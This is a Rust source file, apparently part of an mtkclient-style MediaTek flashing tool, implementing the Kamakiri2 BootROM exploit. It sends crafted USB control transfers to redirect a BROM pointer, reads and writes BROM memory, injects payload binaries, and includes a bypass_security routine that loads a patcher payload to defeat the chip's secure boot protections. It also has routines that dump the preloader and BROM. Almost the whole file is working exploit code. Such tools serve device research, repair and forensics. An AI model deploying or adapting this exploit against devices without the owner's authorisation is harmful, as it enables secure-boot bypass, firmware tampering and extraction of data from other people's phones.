//! Kamakiri2 exploit 实现
//!
//! 包含 Kamakiri2 漏洞利用的完整流程：
//! - da_read/da_write：通过 kamakiri2 漏洞读写 BROM 内存
//! - inject_payload：注入 kamakiri2 payload
//! - dump_preloader_payload：流式 dump preloader
//! - bypass_security：注入 patcher payload 绕过安全保护

use log::{debug, info, warn};
use std::time::Duration;

use crate::paths::exe_relative_path;
use crate::preloader::Preloader;
use crate::usb::UsbContext;

macro_rules! debug_log {
    ($debug:expr, $($arg:tt)*) => {
        if $debug {
            debug!($($arg)*);
        }
    };
}

impl Preloader {
    fn ptr_da_bra(&self) -> u32 {
        let chip = self.chip.unwrap();
        chip.ptr_da_bra.unwrap_or(chip.brom_register_access.1)
    }

    fn ptr_send_addr(&self) -> u32 {
        let chip = self.chip.unwrap();
        chip.ptr_send_addr.unwrap_or(chip.send_ptr.1)
    }

    /// Kamakiri2 单步：设置 BROM 内存访问指针
    ///
    /// libusb 路径：USB control transfer exploit（标准 kamakiri2）
    /// 串口路径：NO-OP（跳过 setup steps）
    ///
    /// 原因：刷机匣在串口模式下不执行 kamakiri2 setup steps，
    /// 直接使用 brom_register_access 完成内存读写。
    fn kamakiri2_step(&mut self, lc: &[u8], _ptr_da_bra: u32, addr: u32) -> Result<(), String> {
        debug!("[STEP] addr=0x{:08X}", addr);
        if self.device.is_libusb() {
            let mut d = lc.to_vec();
            d.extend(&addr.to_le_bytes());
            debug!("[STEP] payload({} bytes): {:02X?}", d.len(), d);
            debug!("[STEP]   linecode: {:02X?}", lc);
            debug!("[STEP]   addr_le: {:02X?}", addr.to_le_bytes());
            // 忽略错误，对齐 Python 的 try-except（允许 step 失败）
            // 注意：Python 的 kamakiri2 函数没有 sleep，这里也移除以对齐
            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d);
            let _ = self.device.ctrl_transfer_in(0x80, 0x06, 0x02FF, 0, 9);
        } else {
            debug!("[STEP] serial mode — skipping kamakiri2 setup step");
        }
        Ok(())
    }

    fn da_setup(&mut self, lc: &[u8], ptr_da_bra: u32, watchdog: u32) -> Result<(), String> {
        debug!("[da_setup] ENTER: ptr_da_bra=0x{:08X}, watchdog=0x{:08X}", ptr_da_bra, watchdog);

        // 新增：多次彻底清理
        self.flush_input();
        std::thread::sleep(Duration::from_millis(30));

        // 对齐 Python da_read_write：先尝试 brom_register_access(0, 1) 和 read32(watchdog+0x50)
        // Python 用 try-except 包裹，失败时忽略
        // 这些调用可能会"唤醒"设备的 BROM 协议处理或清除某些状态
        debug!("[da_setup] trying brom_register_access(0, 1) and read32(watchdog+0x50)");
        let _ = self.brom_register_access(0, 0, 1, None, false);
        let _ = self.read32_brom(watchdog.wrapping_add(0x50), 1);
        self.flush_input();   // 新增

        // 再次清理
        self.flush_input();

        // libusb 路径：执行 kamakiri2 steps 设置指针
        if self.device.is_libusb() {
            debug!("[da_setup] executing 3 kamakiri2 steps");
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(5))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(6))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(7))?;
            debug!("[da_setup] 3 kamakiri2 steps completed");
        }
        debug!("[da_setup] EXIT");
        Ok(())
    }

    fn da_read(
        &mut self,
        lc: &[u8],
        ptr_da_bra: u32,
        _ptr_da: u32,
        watchdog: u32,
        addr: u32,
        len: u32,
    ) -> Result<Vec<u8>, String> {
        debug!("[da_read] addr=0x{:08X} len={}", addr, len);

        // 串口路径：调用 da_setup（reset + watchdog），不执行 kamakiri2 steps
        if !self.device.is_libusb() {
            self.da_setup(lc, ptr_da_bra, watchdog)?;
            if addr < 0x40 {
                let r = self.brom_register_access(0, addr, len, None, true)?;
                Ok(r.unwrap_or_default())
            } else {
                let bra_addr = addr.wrapping_sub(0x40); // 对齐 Python：addr - 0x40
                debug!("[da_read] bra_addr=0x{:08X}", bra_addr);
                let r = self.brom_register_access(0, bra_addr, len, None, true)?;
                Ok(r.unwrap_or_default())
            }
        } else {
            // libusb 路径：da_setup 前清理 + da_setup 后清理
            self.flush_input();
            std::thread::sleep(Duration::from_millis(50));
            self.da_setup(lc, ptr_da_bra, watchdog)?;
            self.flush_input(); // 加强清理

            if addr < 0x40 {
            // addr < 0x40: 4 additional steps
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(2))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(3))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(5))?;
            // 对齐 Python：steps 后直接调用 brom_register_access，没有 sleep
            let r = self.brom_register_access(0, addr, len, None, true)?;
            Ok(r.unwrap_or_default())
        } else {
            // addr >= 0x40: 3 additional steps (-2, -3, -4), then use addr - 0x40
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(2))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(3))?;
            self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
            let bra_addr = addr.wrapping_sub(0x40);
            debug!(
                "[da_read] using bra_addr=0x{:08X} (libusb path, addr-0x40)",
                bra_addr
            );
            // 对齐 Python：steps 后直接调用 brom_register_access，没有 sleep
            let r = self.brom_register_access(0, bra_addr, len, None, true)?;
            Ok(r.unwrap_or_default())
        }
        }
    }

    #[allow(clippy::too_many_arguments)]
    fn da_write(
        &mut self,
        lc: &[u8],
        ptr_da_bra: u32,
        _ptr_da: u32,
        watchdog: u32,
        addr: u32,
        data: &[u8],
        check_status: bool,
    ) -> Result<(), String> {
        debug!(
            "[da_write] addr=0x{:08X} len={} data_head={:02X?}",
            addr,
            data.len(),
            &data[..std::cmp::min(data.len(), 16)]
        );

        // 串口路径：调用 da_setup（reset + watchdog），但跳过 kamakiri2 steps
        if !self.device.is_libusb() {
            self.da_setup(lc, ptr_da_bra, watchdog)?;
            if addr < 0x40 {
                debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
                self.brom_register_access(1, addr, data.len() as u32, Some(data), check_status)?;
                Ok(())
            } else {
                let bra_addr = addr.wrapping_sub(0x40); // 对齐 Python：addr - 0x40
                debug!("[da_write] bra_addr=0x{:08X}", bra_addr);
                self.brom_register_access(
                    1,
                    bra_addr,
                    data.len() as u32,
                    Some(data),
                    check_status,
                )?;
                Ok(())
            }
        } else {
            // libusb 路径：da_setup 前清理 + da_setup 后清理
            self.flush_input();
            std::thread::sleep(Duration::from_millis(50));
            self.da_setup(lc, ptr_da_bra, watchdog)?;
            self.flush_input(); // 加强清理

            if addr < 0x40 {
                // addr < 0x40: 4 steps
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(2))?;
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(3))?;
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(5))?;
                debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
                std::thread::sleep(Duration::from_millis(50));
                self.brom_register_access(1, addr, data.len() as u32, Some(data), check_status)?;
                Ok(())
            } else {
                // addr >= 0x40: 3 additional steps (-2, -3, -4), then use addr - 0x40
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(2))?;
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(3))?;
                self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(4))?;
                let bra_addr = addr.wrapping_sub(0x40);
                debug!(
                    "[da_write] using bra_addr=0x{:08X} (libusb path, addr-0x40)",
                    bra_addr
                );
                std::thread::sleep(Duration::from_millis(50));
                self.brom_register_access(
                    1,
                    bra_addr,
                    data.len() as u32,
                    Some(data),
                    check_status,
                )?;
                Ok(())
            }
        }
    }

    fn read_payload_address(
        &mut self,
        lc: &[u8],
        ptr_da_bra: u32,
        ptr_da: u32,
        watchdog: u32,
    ) -> Result<u32, String> {
        let send_ptr_addr = self.ptr_send_addr();
        debug!("[read_payload_address] send_ptr_addr=0x{:08X}", send_ptr_addr);
        debug!("[read_payload_address] calling da_read to read from device memory");
        let ptr_send_data = self.da_read(lc, ptr_da_bra, ptr_da, watchdog, send_ptr_addr, 4)?;
        debug!("[read_payload_address] da_read returned: {:02X?}", ptr_send_data);
        Ok(unpack_u32(&ptr_send_data) + 8)
    }

    fn inject_payload(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
        self.inject_payload_with_options(payload, expected_ack, false, false)
    }

    fn inject_payload_skip_ptr_read(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
        self.inject_payload_with_options(payload, expected_ack, true, false)
    }

    fn inject_payload_skip_all_da(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
        self.inject_payload_with_options(payload, expected_ack, true, true)
    }

    fn inject_payload_with_options(&mut self, payload: &[u8], expected_ack: u32, skip_ptr_read: bool, skip_da_write: bool) -> Result<(), String> {
        let chip = self.chip.ok_or_else(|| "未识别的处理器型号".to_string())?;
        let ptr_da_bra = self.ptr_da_bra();
        let ptr_da = chip.brom_register_access.1; // 对齐 Python: brom_register_access[0][1]

        debug!("[inject] payload_size={}, skip_ptr_read={}, skip_da_write={}", payload.len(), skip_ptr_read, skip_da_write);
        debug!(
            "[inject] ptr_da_bra=0x{:08X} ptr_da=0x{:08X}",
            ptr_da_bra, ptr_da
        );

        // Kamakiri2 必须走 libusb（ctrl_transfer），串口不支持
        if !self.device.is_libusb() {
            return Err(
                "Kamakiri2 需要 libusb 设备（ctrl_transfer），当前为串口模式，请先切换到 WinUSB"
                    .into(),
            );
        }
        info!("[EXPLOIT] using libusb backend — Kamakiri2 via ctrl_transfer");
        // linecode：通过 ctrl_transfer 动态获取（7 字节），补齐 1 字节零到 8 字节
        let mut linecode = self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?;
        linecode.push(0);
        let linecode = linecode;
        let lc = linecode;
        debug!("[inject] linecode={:02X?}", lc);

        if skip_da_write {
            // dump payload 场景：完全跳过 da_read 和 da_write
            // 只执行 kamakiri2 steps 设置指针，然后通过 ctrl_transfer 直接发送 payload
            info!("[inject] skip_da_write=true → 使用纯 ctrl_transfer 路径");

            let ptr_send = self.ptr_send_addr();
            debug!("[inject] ptr_send=0x{:08X}", ptr_send);

            // 执行 kamakiri2 steps 设置指针（对齐 Python kamakiri2 步骤）
            debug!("[inject] 执行 kamakiri2 steps 设置指针...");
            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(5))?;
            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(6))?;
            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(7))?;

            // 通过 ctrl_transfer 直接发送 payload（对齐 Python send_payload）
            debug!("[inject] 通过 ctrl_transfer 发送 payload ({} 字节)...", payload.len());
            let mut d = lc.to_vec();
            d.extend(&chip.brom_payload_addr.to_le_bytes());
            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d)?;

            // 发送 payload 数据
            let chunk_size = 0x40;
            for chunk in payload.chunks(chunk_size) {
                let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, chunk)?;
            }

            // 设置 ptr_send 指向 payload 地址
            let mut d2 = lc.to_vec();
            d2.extend(&ptr_send.to_le_bytes());
            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d2)?;

            let mut d3 = lc.to_vec();
            d3.extend(&chip.brom_payload_addr.to_le_bytes());
            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d3)?;

            // 发送 payload 后立即读 ack，不要 flush 太早
            debug!("[inject] 发送 payload 完成，等待 ack...");
            let mut ack_buf = [0u8; 4];
            self.device.set_timeout(Duration::from_millis(8000));
            match self.device.read_exact(&mut ack_buf) {
                Ok(_) if ack_buf == [0xC1, 0xC2, 0xC3, 0xC4] => {
                    debug!("[inject] ack 成功: 0xC1C2C3C4");
                }
                Ok(_) => return Err(format!("ack 不匹配: {:02X?}", ack_buf)),
                Err(e) => return Err(format!("读 ack 失败: {}", e)),
            }

            // 只做最小清理
            self.flush_input();
            std::thread::sleep(Duration::from_millis(300));
            let _ = self.device.clear_halt_in();

            return Ok(());
        } else {
            let ptr_send = if skip_ptr_read {
                // dump payload 场景：直接使用 ptr_send_addr，不调用 da_read
                let ptr_send = self.ptr_send_addr();
                debug!("[inject] skip_ptr_read=true, using ptr_send=0x{:08X}", ptr_send);
                ptr_send
            } else {
                // 正常场景：通过 da_read 读取 ptr_send
                let ptr_send = self.read_payload_address(&lc, ptr_da_bra, ptr_da, chip.watchdog)?;
                debug!("[inject] ptr_send=0x{:08X}", ptr_send);
                ptr_send
            };

            debug!("[inject] da_write #1: payload to brom_payload_addr");
            self.da_write(
                &lc,
                ptr_da_bra,
                ptr_da,
                chip.watchdog,
                chip.brom_payload_addr,
                payload,
                true,
            )?;

            debug!("[inject] da_write #2: payload_addr to ptr_send");
            self.da_write(
                &lc,
                ptr_da_bra,
                ptr_da,
                chip.watchdog,
                ptr_send,
                &chip.brom_payload_addr.to_le_bytes(),
                false,
            )?;
        }

        std::thread::sleep(Duration::from_millis(200));

        let orig_timeout = self.device.get_timeout();
        self.device.set_timeout(Duration::from_millis(5000));
        let mut ack = [0u8; 4];
        match self.device.read(&mut ack) {
            Ok(n) => {
                debug!("ack read: {} bytes, data={:02X?}", n, &ack[..n]);
                if n < 4 || u32::from_be_bytes(ack) != expected_ack {
                    self.device.set_timeout(orig_timeout);
                    return Err(format!(
                        "ack 失败: 期望 0x{:08X}，收到 {:02X?}",
                        expected_ack,
                        &ack[..n]
                    ));
                }
            }
            Err(e) => {
                self.device.set_timeout(orig_timeout);
                return Err(format!("ack 读取错误: {}", e));
            }
        }
        self.device.set_timeout(orig_timeout);
        debug!("payload 注入成功");

        // 核心修复：Payload 运行后可能会返回多组 Ack 或其他干扰数据，
        // 必须在返回前彻底清空输入缓冲区，否则后续 BROM 指令（如 0xD1）
        // 的 echo 会读到这些残留数据（例如读到 0xA1 而不是 0xD1）。
        self.flush_input();
        std::thread::sleep(Duration::from_millis(100));
        let _ = self.device.clear_halt_in();
        let _ = self.device.clear_halt_out();

        Ok(())
    }

    // 预留：dump-preloader 独立命令使用
    #[allow(dead_code)]
    pub fn run_kamakiri2(&mut self) -> Result<(Vec<u8>, String), String> {
        info!("Running Kamakiri2...");
        let chip = self.chip.ok_or_else(|| "未识别的处理器型号".to_string())?;
        let payload_path = exe_relative_path(&format!("payloads/{}", chip.loader));
        let payload = std::fs::read(&payload_path).map_err(|e| format!("payload: {}", e))?;

        self.inject_payload(&payload, 0xA1A2A3A4)?;

        let mut len_buf = [0u8; 4];
        self.device.set_timeout(Duration::from_millis(3000));
        if let Ok(4) = self.device.read_exact(&mut len_buf) {
            let length = u32::from_le_bytes(len_buf) as usize;
            if length > 0x10000 && length < 0x100000 {
                let mut data = vec![0u8; length];
                self.device.set_timeout(Duration::from_millis(10000));
                // 使用 read_exact：单次 bulk transfer，不重试循环
                // 对齐 Python usbread(length) — 精确读 length 字节，读完就停
                let transferred = self
                    .device
                    .read_exact(&mut data)
                    .map_err(|e| format!("read preloader: {}", e))?;
                if transferred < length {
                    debug!(
                        "preloader 数据不完整: 期望 {} 字节，实际 {} 字节",
                        length, transferred
                    );
                }
                data.truncate(transferred);
                if let Some(info_idx) = data.windows(16).position(|w| w == b"MTK_BLOADER_INFO") {
                    let filename_start = info_idx + 0x1B;
                    let filename_end = std::cmp::min(filename_start + 0x30, data.len());
                    let filename_bytes = &data[filename_start..filename_end];
                    let filename_len = filename_bytes
                        .iter()
                        .position(|&b| b == 0)
                        .unwrap_or(filename_bytes.len());
                    let filename =
                        String::from_utf8_lossy(&filename_bytes[..filename_len]).to_string();
                    info!("Kamakiri2 OK");
                    return Ok((data, filename));
                }
            }
        }
        info!("Kamakiri2 OK（未返回 preloader 数据）");
        Ok((Vec::new(), String::new()))
    }

    // 预留：bypass_security 修复时使用
    #[allow(dead_code)] // 预留：bypass_security 修复时注入自定义 payload 入口
    pub fn run_payload(&mut self, filename: &str, expected_ack: u32) -> Result<(), String> {
        let payload_path = exe_relative_path(&format!("payloads/{}", filename));
        let payload = std::fs::read(&payload_path)
            .map_err(|e| format!("读取 payload {}: {}", filename, e))?;

        self.inject_payload(&payload, expected_ack)?;
        debug!("{} 注入成功", filename);
        Ok(())
    }

    pub fn run_payload_from_data(
        &mut self,
        payload: &[u8],
        expected_ack: u32,
    ) -> Result<(), String> {
        self.inject_payload(payload, expected_ack)
    }

    /// 从 RAM 中 dump preloader（Kamakiri2 漏洞利用后）
    #[allow(dead_code)]
    pub fn dump_preloader_from_ram(&mut self, debug: bool) -> Result<Vec<u8>, String> {
        info!("正在从 RAM 提取 Preloader...");

        let start_addr: u32 = 0x200000;
        let initial_dwords: usize = 0x10000 / 4;
        let data = self.read32_brom(start_addr, initial_dwords)?;
        let initial_bytes: Vec<u8> = data.iter().flat_map(|&w| w.to_le_bytes()).collect();

        debug_log!(debug, "  原始 RAM 数据前 64 字节:");
        for i in (0..64.min(initial_bytes.len())).step_by(16) {
            let end = (i + 16).min(initial_bytes.len());
            let hex_str: String = initial_bytes[i..end]
                .iter()
                .map(|b| format!("{:02X} ", b))
                .collect();
            debug_log!(debug, "    [0x{:04X}] {}", i, hex_str);
        }

        let signature: [u8; 8] = [0x4D, 0x4D, 0x4D, 0x01, 0x38, 0x00, 0x00, 0x00];
        let mut idx = 0;
        for i in 0..initial_bytes.len().saturating_sub(7) {
            if initial_bytes[i..i + 8] == signature {
                idx = i;
                break;
            }
        }
        if idx == 0 {
            return Err("未在 RAM 中找到 Preloader 签名".to_string());
        }

        info!("  在偏移 0x{:X} 找到 Preloader 签名", idx);
        let data = &initial_bytes[idx..];
        if data.len() < 0x24 {
            return Err("Preloader 数据太短".to_string());
        }

        let length = u32::from_le_bytes([data[0x20], data[0x21], data[0x22], data[0x23]]) as usize;
        info!("  Preloader 长度: 0x{:X} ({} 字节)", length, length);

        let mut all_data = Vec::with_capacity(length);
        all_data.extend_from_slice(data);

        let startidx = idx;
        let multiplier: usize = 32;
        let mut current_idx = idx;

        while (current_idx - startidx) < length {
            let dwords = 4 * multiplier;
            match self.read32_brom(start_addr + current_idx as u32, dwords) {
                Ok(chunk_data) => {
                    let chunk_bytes: Vec<u8> =
                        chunk_data.iter().flat_map(|&w| w.to_le_bytes()).collect();
                    all_data.extend_from_slice(&chunk_bytes);
                    current_idx += chunk_bytes.len();
                }
                Err(e) => {
                    warn!("在 0x{:X} 读取失败: {}", start_addr + current_idx as u32, e);
                    break;
                }
            }
        }

        let preloader = if all_data.len() > length {
            all_data[..length].to_vec()
        } else {
            all_data
        };

        if let Some(info_idx) = preloader.windows(16).position(|w| w == b"MTK_BLOADER_INFO") {
            let filename_start = info_idx + 0x1B;
            let filename_end = std::cmp::min(filename_start + 0x30, preloader.len());
            let filename_bytes = &preloader[filename_start..filename_end];
            let filename_len = filename_bytes
                .iter()
                .position(|&b| b == 0)
                .unwrap_or(filename_bytes.len());
            let filename = String::from_utf8_lossy(&filename_bytes[..filename_len]).to_string();
            info!("  Preloader 文件名: {}", filename);

            use std::fs::File;
            use std::io::Write;
            if !filename.is_empty() {
                match File::create(&filename) {
                    Ok(mut f) => {
                        if let Err(e) = f.write_all(&preloader) {
                            warn!("保存 preloader 失败: {}", e);
                        } else {
                            info!("  成功保存 preloader 到: {}", filename);
                        }
                    }
                    Err(e) => {
                        warn!("failed to create preloader file: {}", e);
                    }
                }
            }
        }

        info!("  Preloader dump complete: {} bytes", preloader.len());
        Ok(preloader)
    }

    pub fn bypass_security(&mut self, _context: &UsbContext) -> Result<(), String> {
        info!("正在绕过安全保护...");

        let payload_path = exe_relative_path("payloads/generic_patcher_payload.bin");
        let payload =
            std::fs::read(&payload_path).map_err(|e| format!("读取 patcher payload: {}", e))?;

        // 注入 patcher payload
        // 串口：通过 brom_register_access 完成（对齐刷机匣行为）
        // libusb：通过 ctrl_transfer 完成
        self.inject_payload(&payload, 0xA1A2A3A4)?;
        debug!("patcher payload 注入完成");

        // 根据 mtkclient-2.0.1\usb_debug.log (第647-648行):
        // 在收到 a1a2a3a4 后，原版工具直接发送 D1 (READ32) 命令，
        // 并没有执行 drain、handshake 或获取 ID 的操作。
        // 额外的操作可能导致设备端 Patcher 状态异常或 USB 管道阻塞。

        info!("安全保护已成功绕过");
        Ok(())
    }

    /// 通过 Kamakiri2 payload 流式 dump preloader（对齐 Python pltools.run_dump_preloader）
    pub fn run_dump_brom_payload(&mut self, filename: &str, debug: bool) -> Result<(), String> {
        let payload_path = exe_relative_path("payloads/generic_dump_payload.bin");
        let payload =
            std::fs::read(&payload_path).map_err(|e| format!("读取 payload 失败: {}", e))?;

        self.run_payload_from_data(&payload, 0xC1C2C3C4)?;

        let data = self.dump_brom(debug)?;

        std::fs::write(filename, &data).map_err(|e| format!("写入文件失败: {}", e))?;

        Ok(())
    }

    /// 通过 Kamakiri2 payload 流式 dump preloader（对齐 Python pltools.run_dump_preloader）
    /// 使用 exploit 路径（inject_payload = brom_register_access），
    /// BROM 阶段的正确方式
    pub fn dump_preloader_payload(
        &mut self,
        _debug: bool,
        quiet: bool,
        _context: &UsbContext,
    ) -> Result<(Vec<u8>, String), String> {
        // 静默模式：关闭 USB READ 调试日志
        if quiet {
            crate::usb::set_quiet_usb_read(true);
        }
        info!("正在提取Preloader...");

        let payload_path = exe_relative_path("payloads/generic_preloader_dump_payload.bin");
        let mut payload =
            std::fs::read(&payload_path).map_err(|e| format!("dump payload: {}", e))?;

        let chip = self.chip.ok_or_else(|| "未识别的处理器型号".to_string())?;

        // fix_payload: 替换 watchdog/uart 地址 + 4字节对齐（da=False，不追加签名空间）
        // 对齐 Python fix_payload(payload, False) for exploit path
        let payload_len = payload.len();
        if payload_len >= 8 {
            let wd_offset = payload_len - 4;
            let ua_offset = payload_len - 8;
            let wd = u32::from_le_bytes([
                payload[wd_offset],
                payload[wd_offset + 1],
                payload[wd_offset + 2],
                payload[wd_offset + 3],
            ]);
            let ua = u32::from_le_bytes([
                payload[ua_offset],
                payload[ua_offset + 1],
                payload[ua_offset + 2],
                payload[ua_offset + 3],
            ]);
            if wd == 0x10007000 {
                debug!(
                    "[dump] fix_payload: watchdog 0x10007000 -> 0x{:08X}",
                    chip.watchdog
                );
                let wd_bytes = chip.watchdog.to_le_bytes();
                payload[wd_offset..wd_offset + 4].copy_from_slice(&wd_bytes);
            }
            if ua == 0x11002000 {
                debug!("[dump] fix_payload: uart 0x11002000 -> 0x{:08X}", chip.uart);
                let ua_bytes = chip.uart.to_le_bytes();
                payload[ua_offset..ua_offset + 4].copy_from_slice(&ua_bytes);
            }
        }
        // 4 字节对齐
        while payload.len() % 4 != 0 {
            payload.push(0);
        }

        // exploit 路径：完全跳过 da_read 和 da_write，使用纯 ctrl_transfer 路径
        debug!("[dump] inject_payload_skip_all_da: size={}", payload.len());
        self.inject_payload_skip_all_da(&payload, 0xC1C2C3C4)?;

        // === 关键：跳过 read_payload_address 和 da_read，直接清理后读数据 ===
        info!("[dump] payload 注入成功 → 跳过 da_read，直接清理并读数据");

        for _ in 0..25 {
            self.flush_input();
            std::thread::sleep(Duration::from_millis(80));
        }
        let _ = self.device.clear_halt_in();
        let _ = self.device.clear_halt_out();

        self.device.set_timeout(Duration::from_millis(30000));

        info!("等待 preloader 数据返回 (长度 + 数据)...");

        let mut len_buf = [0u8; 4];
        self.device.read_exact(&mut len_buf)
            .map_err(|e| format!("读长度失败: {}", e))?;

        let length = u32::from_le_bytes(len_buf) as usize;
        info!("Preloader 长度: 0x{:X} ({} 字节)", length, length);

        if length == 0 || length > 0x300000 {
            return Err("长度异常".into());
        }

        let mut preloader = vec![0u8; length];
        self.device.read_exact(&mut preloader)
            .map_err(|e| format!("读数据失败: {}", e))?;

        let filename = "preloader_dumped.bin";
        std::fs::write(filename, &preloader)
            .map_err(|e| format!("保存失败: {}", e))?;

        info!("Preloader dump 成功！已保存 {}", filename);
        Ok((preloader, filename.to_string()))
    }

    pub fn dump_brom(&mut self, debug: bool) -> Result<Vec<u8>, String> {
        info!("等待 BROM 发送 dump 长度...");

        let mut len_buf = [0u8; 4];
        self.device
            .read(&mut len_buf)
            .map_err(|e| format!("读取长度失败: {}", e))?;
        let length = u32::from_be_bytes(len_buf) as usize;
        debug_log!(debug, "BROM 数据长度: 0x{:X} ({}) 字节", length, length);

        let mut all_data = Vec::with_capacity(length);
        let mut remaining = length;
        const CHUNK: usize = 0x4000;

        while remaining > 0 {
            let chunk_size = if remaining > CHUNK { CHUNK } else { remaining };
            let mut buf = vec![0u8; chunk_size];
            self.device
                .read(&mut buf)
                .map_err(|e| format!("读取 BROM 数据失败: {}", e))?;
            all_data.extend_from_slice(&buf);
            remaining -= chunk_size;

            let progress = (all_data.len() as f64 / length as f64) * 100.0;
            eprint!("\r  进度: {:.1}% ({}/{})", progress, all_data.len(), length);
        }
        debug!("\n");

        Ok(all_data)
    }
}

fn unpack_u32(d: &[u8]) -> u32 {
    u32::from_le_bytes([d[0], d[1], d[2], d[3]])
}
